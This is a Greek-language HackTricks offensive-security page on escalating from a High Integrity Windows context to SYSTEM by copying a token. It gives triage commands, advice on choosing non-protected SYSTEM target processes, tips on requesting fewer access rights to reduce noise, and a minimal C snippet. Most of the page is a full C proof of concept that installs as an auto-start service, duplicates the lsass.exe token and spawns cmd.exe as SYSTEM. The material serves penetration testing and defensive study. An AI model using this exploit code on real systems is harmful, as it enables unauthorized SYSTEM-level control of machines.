# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα καλύπτει την παραλλαγή **manual token-theft** όπου ένα **High Integrity** context που ήδη διαθέτει **`SeDebugPrivilege`** και **`SeImpersonatePrivilege`** ανοίγει μια κατάλληλη διεργασία **SYSTEM**, **διπλασιάζει το token** της και **εκκινεί μια νέα διεργασία** με αυτό το token.

Αν χρειάζεσαι μόνο ένα γρήγορο `SYSTEM` shell από μια privileged admin διεργασία, δες επίσης:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Αν **δεν** έχεις διαδρομή process-handle αλλά έχεις **`SeImpersonatePrivilege`**, η διαδρομή **named-pipe / Potato** είναι συνήθως πιο εύκολη:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Πριν δοκιμάσεις τη διαδρομή token-copy, επιβεβαίωσε ότι η τρέχουσα διεργασία είναι ήδη σε ένα χρήσιμο context:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Σημειώσεις:

- **`SeDebugPrivilege`** είναι αυτό που σου επιτρέπει να ανοίγεις πολλά **μη προστατευμένα** SYSTEM processes ακόμα κι όταν το DACL τους κανονικά θα σε μπλόκαρε.
- **`SeImpersonatePrivilege`** είναι αυτό που κάνει το **`CreateProcessWithTokenW`** πρακτικό μετά.
- Αν το token-copy path σου δίνει μόνο ένα αδύναμο ή filtered SYSTEM token, απλώς κλέψε από ένα **διαφορετικό SYSTEM process**.

## Διάλεξε προσεκτικά το target process

Η technique συνήθως δείχνεται απέναντι στο **`lsass.exe`**, αλλά σε σύγχρονα Windows αυτό συχνά είναι το **λάθος target**:

- Αν είναι ενεργό το **LSA Protection / RunAsPPL**, το **`lsass.exe`** είναι προστατευμένο και ένα κανονικό admin process με `SeDebugPrivilege` πάλι δεν θα μπορεί να το ανοίξει.
- Προτίμησε **non-PPL SYSTEM processes** όπως τα **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, ή ένα πρώιμο **`svchost.exe`** instance.
- Τα **protected processes** και κάποια ειδικά processes όπως το **`System`** ή το **`csrss.exe`** δεν είναι ρεαλιστικοί user-mode targets για αυτή τη technique.
- Χρησιμοποίησε **Process Hacker / Process Explorer** τρέχοντας elevated για να επιβεβαιώσεις αν το target token έχει πραγματικά τα privileges που θέλεις πριν το κάνεις duplicate.

## Λεπτομέρειες API που έχουν σημασία στην πράξη

Πολλά public PoCs ζητούν **`PROCESS_ALL_ACCESS`** και **`TOKEN_ALL_ACCESS`**, αλλά αυτό είναι πιο θορυβώδες από όσο χρειάζεται. Στην πράξη:

- Άνοιξε το target process μόνο με τα rights που χρειάζεσαι (συνήθως **`PROCESS_QUERY_INFORMATION`** ή **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Άνοιξε το token με τα rights που χρειάζονται για process creation: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Χρησιμοποίησε **`DuplicateTokenEx(..., TokenPrimary, ...)`** για να δημιουργήσεις ένα **primary token**· ένα impersonation token μόνο του δεν αρκεί για να δημιουργήσει νέο process.
- Αν το **`CreateProcessWithTokenW`** αποτύχει με **`1314`**, γύρνα στο **`CreateProcessAsUserW`**.
- Αν ξεκινάς από **service / Session 0**, θυμήσου ότι το **`CreateProcessWithTokenW`** κρατά το child στο **session του caller**. Αν χρειάζεσαι ορατό desktop shell, χρησιμοποίησε **`CreateProcessAsUserW`** και μετέφερε το token στο επιθυμητό session.

Ένα ελάχιστο modern flow μοιάζει με:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Ο παρακάτω κώδικας **εκμεταλλεύεται τα privileges `SeDebugPrivilege` και `SeImpersonatePrivilege`** για να αντιγράψει το token από μια **process που τρέχει ως SYSTEM** και με **όλα τα token privileges**. Σε αυτήν την περίπτωση, ο κώδικας μπορεί να μεταγλωττιστεί και να χρησιμοποιηθεί ως ένα **Windows service binary** για να επαληθεύσει ότι το primitive λειτουργεί.

Το κύριο μέρος του **code όπου γίνεται η elevation** βρίσκεται μέσα στη συνάρτηση **`Exploit`**. Μέσα σε αυτήν τη συνάρτηση μπορείς να δεις ότι αναζητείται το **`lsass.exe`**, το **token του αντιγράφεται**, και τελικά αυτό το token χρησιμοποιείται για να εκκινήσει ένα νέο **`cmd.exe`** με όλα τα privileges του αντιγραμμένου token.

Σε σύγχρονα hosts, συχνά θα θέλεις να αντικαταστήσεις το **`lsass.exe`** με άλλη **non-PPL SYSTEM process** όπως **`winlogon.exe`**, **`wininit.exe`**, ή **`services.exe`**.

Άλλες processes που τρέχουν ως SYSTEM με όλα ή τα περισσότερα από τα token privileges είναι: **`services.exe`**, **`svchost.exe`** (κάποιες από τις πρώτες), **`wininit.exe`**, **`csrss.exe`**... Να θυμάσαι ότι γενικά **δεν θα μπορείς να αντιγράψεις token από protected process**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Αναφορές

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
